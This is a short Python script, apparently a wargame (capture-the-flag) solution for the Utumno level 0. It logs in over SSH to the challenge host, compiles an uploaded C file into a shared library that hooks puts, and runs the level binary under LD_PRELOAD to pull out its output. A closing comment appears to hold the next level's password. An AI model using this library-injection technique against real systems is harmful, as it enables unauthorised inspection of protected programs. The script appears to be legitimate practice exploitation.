
from lib.exploit import *


s = ssh("utumno0", "176.9.9.172", 2227, "utumno0", cache=True)


puts_hook_code = read("0/puts-hook.c")
upload(s, puts_hook_code, "/tmp/hook-puts.c")
s.process("gcc -m32 -fPIC -c /tmp/hook-puts.c -o /tmp/hook-puts", shell=True, cwd="/tmp/")
s.process("ld -shared -m elf_i386 -o /tmp/hook-puts.so /tmp/hook-puts -ldl", shell=True, cwd="/tmp/")
r = s.process(["/utumno/utumno0"], env={"LD_PRELOAD": "/tmp/hook-puts.so"}).recvall()
log.info(f"r: {r}")



# aathaeyiew

